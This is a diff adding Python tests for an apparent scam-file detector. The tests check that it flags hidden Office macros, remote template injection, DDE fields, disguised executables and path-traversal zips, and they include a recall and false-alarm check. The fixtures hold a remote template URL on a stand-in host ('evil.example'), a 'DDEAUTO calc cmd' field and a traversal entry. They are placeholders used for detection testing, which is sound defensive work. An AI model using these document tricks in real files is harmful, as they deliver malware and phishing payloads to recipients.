@@ -217,3 +217,80 @@ def test_two_manifests_and_a_fake_apk_name():
         z.writestr("AndroidManifest.xml", make_axml("com.b.b", [OVL]))
     assert "file_zip_tricks" in codes("d.apk", b.getvalue())
     assert "file_unreadable" in codes("photo.apk", b"hello world, not a zip")
+
+
+W = 'xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"'
+BODY = f"<w:document {W}><w:body><w:p><w:r><w:t>Notis rasmi untuk anda</w:t></w:r></w:p></w:body></w:document>"
+
+
+def docx_zip(extra=None, ext_rels=None, doc=BODY):
+    files = {"[Content_Types].xml": "<x/>", "word/document.xml": doc}
+    files.update(extra or {})
+    if ext_rels:
+        files["word/_rels/settings.xml.rels"] = ext_rels
+    return zipped(files)
+
+
+def test_macro_flags_and_hidden_macro():
+    macro = docx_zip({"word/vbaProject.bin": "x"})
+    assert codes("report.docm", macro) == ["file_macro"]
+    assert verdict("report.docm", macro) == "caution"  # macros alone: weak
+    assert "file_macro_hidden" not in codes("report.docx", macro)  # a plain .docx name alone is not enough
+    assert "file_macro_hidden" in codes("report.docx", macro, via_chat=True)
+    assert verdict("report.docx", macro, chat=True) == "likely_scam"
+    xlm = zipped({"[Content_Types].xml": "<x/>", "xl/workbook.xml": "<a/>", "xl/macrosheets/sheet1.xml": "<a/>"})
+    assert "file_macro" in codes("book.xlsx", xlm)  # Excel 4.0 macro sheets
+
+
+def test_remote_template_and_dde_are_strong_and_clean_docx_has_none():
+    rels = '<Relationships><Relationship Id="r1" Type="http://x/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>'
+    assert "file_office_remote" in codes("a.docx", docx_zip(ext_rels=rels))
+    assert verdict("a.docx", docx_zip(ext_rels=rels)) == "likely_scam"
+    dde = f"<w:document {W}><w:body><w:p><w:r><w:instrText> DDEAUTO calc cmd </w:instrText></w:r></w:p></w:body></w:document>"
+    assert "file_office_remote" in codes("b.docx", docx_zip(doc=dde))
+    link = '<Relationships><Relationship Id="r1" Type="http://x/relationships/hyperlink" Target="http://a.example" TargetMode="External"/></Relationships>'
+    assert codes("c.docx", docx_zip(ext_rels=link)) == []  # an ordinary hyperlink is not a template
+
+
+def test_legacy_ole_and_password_protected_office():
+    ole = bytes.fromhex("d0cf11e0a1b11ae1") + b"0" * 64
+    macro = ole + "_VBA_PROJECT".encode("utf-16-le")
+    assert codes("old.doc", macro) == ["file_macro"]
+    assert codes("old.doc", ole) == []
+    assert codes("secret.docx", ole + "EncryptedPackage".encode("utf-16-le")) == ["file_encrypted"]
+    assert verdict("old.xls", macro) == "caution"
+
+
+def test_plain_docx_letter_with_remote_template_still_gets_read_and_flagged():
+    from app import ingest
+    rels = '<Relationships><Relationship Id="r1" Type="http://x/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/></Relationships>'
+    doc = ingest.extract("letter.docx", None, docx_zip(ext_rels=rels, doc='<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Notis LHDN bayar sekarang</w:t></w:r></w:p></w:body></w:document>'))[0]
+    assert doc.kind == "docx" and "Notis LHDN" in doc.text and "file_office_remote" in doc.signals
+
+
+def test_file_eval_set_recall_and_false_alarms():
+    """Labelled synthetic profiles, like the text eval gate: scam-style files must reach likely_scam, innocent ones must not."""
+    BANK = "com.evil.bank"
+    scam = [  # (name, bytes, came by chat)
+        ("JEMPUTAN KAHWIN.apk", apk("com.x.card", [SMS, OVL]), False),  # Tria-like
+        ("update.apk", apk(BANK, [SMS], label="Maybank Secure"), True),  # fake bank app
+        ("saman.apk", apk("com.x.s", [], [ACC]), True),  # accessibility service alone, via chat
+        ("Sila semak bil anda.vbs", b"x" * 40, True),  # script on WhatsApp Web
+        ("bil.zip", zipped({"bil anda.pdf.exe": b"MZ"}), False),  # PDF-looking executable in a zip
+        ("slip.docx", docx_zip({"word/vbaProject.bin": "x"}), True),  # hidden macro, via chat
+        ("notis.docx", docx_zip(ext_rels='<Relationships><Relationship Type="x/attachedTemplate" Target="http://a.example/t" TargetMode="External"/></Relationships>'), False),
+        ("x.zip", zipped({"../../a.exe": b"MZ"}), False),  # traversal
+    ]
+    legit = [
+        ("flashlight.apk", apk("com.example.flash", ["android.permission.INTERNET"], label="Flashlight"), False),
+        ("messages.apk", apk("com.example.sms", [SMS], label="Messages"), False),  # a real SMS app reads SMS
+        ("documents.zip", zipped({"notice.pdf": b"%PDF-1.4", "photo.jpg": b"\xff\xd8\xff"}), False),
+        ("payslips.zip", zipped({"jan.pdf": b"%PDF-1.4", "feb.pdf": b"%PDF-1.4"}), True),  # chat alone, nothing risky inside
+        ("report.docx", docx_zip(), True),
+        ("budget.xlsm", zipped({"[Content_Types].xml": "<x/>", "xl/workbook.xml": "<a/>", "xl/vbaProject.bin": "x"}), False),  # in-house macro file
+        ("old.doc", bytes.fromhex("d0cf11e0a1b11ae1") + b"0" * 64 + "_VBA_PROJECT".encode("utf-16-le"), False),
+    ]
+    hits = sum(verdict(n, d, c) == "likely_scam" for n, d, c in scam)
+    false_alarms = [n for n, d, c in legit if verdict(n, d, c) == "likely_scam"]
+    assert hits / len(scam) >= 0.9, f"recall {hits}/{len(scam)}"
+    assert not false_alarms, false_alarms
